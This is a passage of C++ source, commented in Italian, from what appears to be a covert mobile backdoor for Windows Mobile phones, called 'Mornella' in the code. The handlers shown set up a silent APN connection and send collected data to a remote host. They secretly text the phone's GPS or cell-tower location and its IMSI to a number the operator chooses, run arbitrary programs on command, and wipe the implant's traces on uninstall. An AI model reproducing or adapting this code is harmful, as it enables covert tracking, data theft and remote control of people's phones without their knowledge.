			if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
				delete[] wsz_Output;

			DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [RegistryGetString() failed]\n", 4, FALSE);
			return FALSE;
		}

		hr = CLSIDFromString(wGuid, &IID_Internet);

		if (hr != NOERROR) {
			delete[] pApn;

			if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
				delete[] wsz_Output;

			DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [CLSIDFromString() failed]\n", 4, FALSE);
			return FALSE;
		}

		// Connettiti tramite il connection manager
		CONNMGR_CONNECTIONINFO ConnectionInfo;
		DWORD dwStatus;

		ZeroMemory (&ConnectionInfo, sizeof (ConnectionInfo));
		ConnectionInfo.cbSize = sizeof (ConnectionInfo);

		ConnectionInfo.dwParams = CONNMGR_PARAM_GUIDDESTNET; 
		ConnectionInfo.dwFlags = CONNMGR_FLAG_NO_ERROR_MSGS; 
		ConnectionInfo.dwPriority = CONNMGR_PRIORITY_HIPRIBKGND; 
		ConnectionInfo.guidDestNet = IID_Internet;

		hr = ConnMgrEstablishConnectionSync (&ConnectionInfo, &_hConnection, 30000, &dwStatus);

		if (hr != S_OK) {
			if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
				delete[] wsz_Output;

			DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [ConnMgrEstablishConnectionSync() failed]\n", 4, FALSE);
			continue;
		}

		// Inviamo i dati
		UINT uRet = InternetSend(strHost);

		switch (uRet) {
			case SEND_UNINSTALL: 
				DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [SEND_UNINSTALL] received\n", 5, FALSE);
				m_bUninstall = TRUE;
				break;

			case SEND_RELOAD:
				DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [SEND_RELOAD] received\n", 5, FALSE);
				m_bReload = TRUE;
				break;

			default: 
				break;
		}

		ConnMgrReleaseConnection(_hConnection, 0);

		// Dobbiamo attendere che termini la connessione altrimenti non possiamo rimuoverla
		Sleep(1500);

		if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
			delete[] wsz_Output;

		if (uRet != FALSE) {
			delete[] pApn;

			DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [APN Send] OK\n", 4, FALSE);
			return TRUE;
		}
	}

	delete[] pApn;

	if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
		delete[] wsz_Output;

	DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() Unable to perform\n", 5, FALSE);
	return TRUE;
}

BOOL Task::ActionUninstall(pActionStruct pAction) {
	const auto_ptr<Log> LocalLog(new(std::nothrow) Log);
	HMODULE hSmsFilter = NULL;
	typedef HRESULT (*pUnregister)();

	pUnregister UnregisterFunction;

	StopAgents();
	StopEvents();

	Sleep(500);

	if (uberlogObj == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionUninstall() [Uberlog obj not found, exiting]\n", 4, FALSE);
		return FALSE;
	}

	// Rimuoviamo il servizio
	RegDeleteKey(HKEY_LOCAL_MACHINE, MORNELLA_SERVICE_PATH);

	uberlogObj->DeleteAll();

	if (LocalLog.get() == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionUninstall() [LocalLog.get failed]\n", 4, FALSE);
		return FALSE;
	}

	LocalLog->RemoveMarkups();

	if (confObj)
		confObj->RemoveConf();

	LocalLog->RemoveLogDirs();

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		UnregisterFunction = (pUnregister)GetProcAddress(hSmsFilter, L"DllUnregisterServer");

		if (UnregisterFunction != NULL) {
			UnregisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}

	// Rimuoviamo la DLL del filtro SMS
	DeleteFile(SMS_DLL_PATH);
	
	RegFlushKey(HKEY_LOCAL_MACHINE);
	RegFlushKey(HKEY_CLASSES_ROOT);

	// Costruiamo il nome della connessione su APN
	LPWSTR wsz_Output;
	wstring wImei = deviceObj->GetImei();
	wImei = wImei.assign(wImei, wImei.size() - 9, 8);

	// Costruiamo l'XML per la rimozione della connessione
	wstring wsz_Delete =
		L"<wap-provisioningdoc>"
		L"<characteristic type=\"CM_GPRSEntries\">"
		L"<nocharacteristic type=\"";
	wsz_Delete += wImei.c_str();
	wsz_Delete += L"\"/></characteristic></wap-provisioningdoc>";

	// Rimuoviamo eventuali APN
	if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
		delete[] wsz_Output;

	DBG_TRACE(L"Debug - Task.cpp - ActionUninstall() OK\n", 4, FALSE);
	return TRUE;
}

BOOL Task::ActionReload(pActionStruct pAction) {
	DBG_TRACE(L"Debug - Task.cpp - ActionReload() OK\n", 4, FALSE);
	return TRUE;
}

BOOL Task::ActionSms(pActionStruct pAction) {
#define GPS_TIMEOUT		320 // 320 secondi
#define GPS_TIMESLICE	10  // In step di 10 secondi

#define CELL_TIMEOUT	30  // 30 secondi
#define CELL_TIMESLICE	10  // In step di 10 secondi

#define SMS_GPS  1
#define SMS_IMSI 2
#define SMS_TEXT 3

	GPS *gpsObj = GPS::self(30000, 1000);
	Cell *cellObj = Cell::self(30000);
	
	GPS_POSITION position;
	RILCELLTOWERINFO cell;

	DWORD dwGpsFields, dwCellFields, dwNumLen;
	DWORD dwMCC, dwMNC, dwTextLen;
	WCHAR wNumber[17];
	WCHAR wTmp[71]; // Codifica a 7 bit per 160 caratteri
	wstring strText;
	BOOL bGpsAcquired;
	BYTE *pParams;
	UINT i, uOpt;

	if (pAction->uParamLength < sizeof(UINT))
		return FALSE;

	if (deviceObj->IsGsmEnabled() == FALSE)
		return FALSE;

	ZeroMemory(&position, sizeof(position));
	ZeroMemory(&cell, sizeof(cell));
	ZeroMemory(&wNumber, sizeof(wNumber));
	ZeroMemory(&wTmp, sizeof(wTmp));

	// I primi 4 byte indicano se vogliamo il GPS, l'IMSI o spediamo un testo
	pParams = (BYTE *)pAction->pParams;
	CopyMemory(&uOpt, pParams, sizeof(uOpt)); pParams += 4;

	if (uOpt == 0)
		return FALSE;

	// Leggiamo la dword della lunghezza del numero
	CopyMemory(&dwNumLen, pParams, sizeof(dwNumLen)); pParams += 4;

	if (dwNumLen == 0)
		return FALSE;

	// Copiamo il numero
	CopyMemory(&wNumber, pParams, (dwNumLen > 16 * sizeof(WCHAR)) ? 16 * sizeof(WCHAR) : dwNumLen); 

	// Eventualmente anche il testo del messaggio NULL-terminato e la sua lunghezza
	if (uOpt == SMS_TEXT) {
		pParams += dwNumLen;
		CopyMemory(&dwTextLen, pParams, sizeof(dwTextLen));
		
		if (dwTextLen == 0)
			return FALSE;

		pParams += 4;
		strText = (WCHAR *)pParams;
	}

	auto_ptr<Sms> sms(new(std::nothrow) Sms());

	if (sms.get() == NULL)
		return FALSE;

	// Vogliamo il GPS?
	if (uOpt == SMS_GPS) {
		if (gpsObj == NULL)
			return FALSE;

		dwGpsFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;
		bGpsAcquired = FALSE;

		do {
			if (gpsObj->Start() == FALSE)
				break;

			if (gpsObj->getGPS(&position) && (position.dwValidFields & dwGpsFields) == dwGpsFields &&
				position.FixType == GPS_FIX_3D) {
				
				bGpsAcquired = TRUE;
				_snwprintf(wTmp, 70, L"GPS lat: %f lon: %f\n", position.dblLatitude, position.dblLongitude);
				gpsObj->Stop();
				break;
			} 
			
			// Polliamo se non riusciamo subito ad avere una posizione
			for (i = 0; i < GPS_TIMEOUT / GPS_TIMESLICE; i++) {
				Sleep(GPS_TIMESLICE * 1000);

				if (gpsObj->getGPS(&position) && (position.dwValidFields & dwGpsFields) == dwGpsFields &&
					position.FixType == GPS_FIX_3D) {

					bGpsAcquired = TRUE;
					_snwprintf(wTmp, 70, L"GPS lat: %f lon: %f\n", position.dblLatitude, position.dblLongitude);
					gpsObj->Stop();
					break;
				}
			}
			
			gpsObj->Stop();
		} while(0);

		Sleep(2000);

		// Se non abbiamo il GPS, proviamo con la cella
		do {
			dwCellFields =  RIL_PARAM_CTI_LOCATIONAREACODE | RIL_PARAM_CTI_CELLID;

			dwMCC = deviceObj->GetMobileCountryCode();
			dwMNC = deviceObj->GetMobileNetworkCode();

			if (bGpsAcquired)
				break;

			if (cellObj->Start() == FALSE)
				break;

			if (cellObj->getCELL(&cell) && (cell.dwParams & dwCellFields) == dwCellFields) { // Se abbiamo una cella valida
				if (cell.dwMobileCountryCode == 0)
					cell.dwMobileCountryCode = dwMCC;

				if (cell.dwMobileNetworkCode == 0)
					cell.dwMobileNetworkCode = dwMNC;

				_snwprintf(wTmp, 70, L"CC: %d, MNC: %d, LAC: %d, CID: %d\n", cell.dwMobileCountryCode, 
					cell.dwMobileNetworkCode, cell.dwLocationAreaCode, cell.dwCellID);

				cellObj->Stop();
				break;
			} 

			for (i = 0; i < CELL_TIMEOUT / CELL_TIMESLICE; i++) {
				Sleep(CELL_TIMESLICE * 1000);

				if (cellObj->getCELL(&cell) && (cell.dwParams & dwCellFields) == dwCellFields) {
					if (cell.dwMobileCountryCode == 0)
						cell.dwMobileCountryCode = dwMCC;

					if (cell.dwMobileNetworkCode == 0)
						cell.dwMobileNetworkCode = dwMNC;

					_snwprintf(wTmp, 70, L"CC: %d, MNC: %d, LAC: %d, CID: %d\n", cell.dwMobileCountryCode, 
						cell.dwMobileNetworkCode, cell.dwLocationAreaCode, cell.dwCellID);

					cellObj->Stop();
					break;
				}
			}

			cellObj->Stop();
		} while(0);

		strText = wTmp;
	}

	if (uOpt == SMS_IMSI && deviceObj->GetImsi().empty() == FALSE) {
		strText += L"IMSI: ";
		strText += deviceObj->GetImsi();
	}

	if (uOpt == SMS_GPS && strText.empty() == TRUE)
		strText = L"Cell and GPS info not available";

	// Manda il messaggio e torna
	BOOL bRes;

	strText.resize(70);
	bRes = sms->SendMessage(wNumber, (const LPWSTR)strText.c_str());

	DBG_TRACE(L"Debug - Task.cpp - ActionSms() Performed\n", 4, FALSE);
	return bRes;
}

BOOL Task::ActionToothing(pActionStruct pAction) {
	if (pAction->pParams == NULL)
		return FALSE;

	DBG_TRACE(L"Debug - Task.cpp - ActionToothing() OK\n", 4, FALSE);
	return TRUE;
}

BOOL Task::ActionStartAgent(pActionStruct pAction) {
	UINT uAgentId;

	if (pAction->pParams == NULL)
		return FALSE;

	CopyMemory(&uAgentId, pAction->pParams, sizeof(UINT));

	DBG_TRACE(L"Debug - Task.cpp - ActionStartAgent() Performed\n", 4, FALSE);
	return StartAgent(uAgentId);
}

BOOL Task::ActionStopAgent(pActionStruct pAction) {
	UINT uAgentId;

	if (pAction->pParams == NULL)
		return FALSE;

	CopyMemory(&uAgentId, pAction->pParams, sizeof(UINT));

	DBG_TRACE(L"Debug - Task.cpp - ActionStopAgent() Performed\n", 4, FALSE);
	return StopAgent(uAgentId);
}

BOOL Task::ActionExecute(pActionStruct pAction) {
	size_t strSpecialVar;
	wstring strExecutePath, strBackdoorPath;
	PROCESS_INFORMATION pi;
	PBYTE pParams;
	UINT uCommandLen;
	BOOL bRet;

	if (pAction->pParams == NULL)
		return FALSE;

	// Lunghezza della stringa da eseguire
	pParams = (BYTE *)pAction->pParams;

	CopyMemory(&uCommandLen, pParams, sizeof(UINT));
	pParams += sizeof(UINT);

	ZeroMemory(&pi, sizeof(pi));

	// Espandiamo $dir$ se presente
	strBackdoorPath = GetCurrentPath(NULL);
	strExecutePath = (PWCHAR)pParams;

	if (strExecutePath.empty()) {
		DBG_TRACE(L"Debug - Task.cpp - ActionExecute() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	if (strBackdoorPath.empty() == FALSE) {
		strSpecialVar = strExecutePath.find(L"$dir$\\");

		// Se troviamo $dir$ nella search string espandiamolo
		if (strSpecialVar != wstring::npos)
			strExecutePath.replace(strSpecialVar, 6, strBackdoorPath); // Qui $dir$ viene espanso
	}

	bRet = CreateProcess(strExecutePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, 
						NULL, NULL, NULL, &pi);

	if (bRet == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ActionExecute() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	if (pi.hProcess != INVALID_HANDLE_VALUE && pi.hProcess != 0)
		CloseHandle(pi.hProcess);

	DBG_TRACE(L"Debug - Task.cpp - ActionExecute() Performed\n", 4, FALSE);
	return TRUE;
}

BOOL Task::ActionLog(pActionStruct pAction) {
	Log logInfo;
	PBYTE pParams, pMsg;
	UINT uLen;

	if (pAction->pParams == NULL)
		return FALSE;

	// Lunghezza della stringa da eseguire
	pParams = (BYTE *)pAction->pParams;

	CopyMemory(&uLen, pParams, sizeof(UINT));
	pParams += sizeof(UINT);

	if (uLen < sizeof(WCHAR))
		return TRUE;

	pMsg = new(std::nothrow) BYTE[uLen]; // Len + NULL

	if (pMsg == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionLog() FAILED [cannot allocate memory]\n", 4, FALSE);
		return FALSE;
	}

	ZeroMemory(pMsg, uLen);
	CopyMemory(pMsg, pParams, uLen);

	logInfo.WriteLogInfo((PWCHAR)pMsg);

	DBG_TRACE(L"Debug - Task.cpp - ActionLog() Performed\n", 4, FALSE);

	delete[] pMsg;
	return TRUE;
}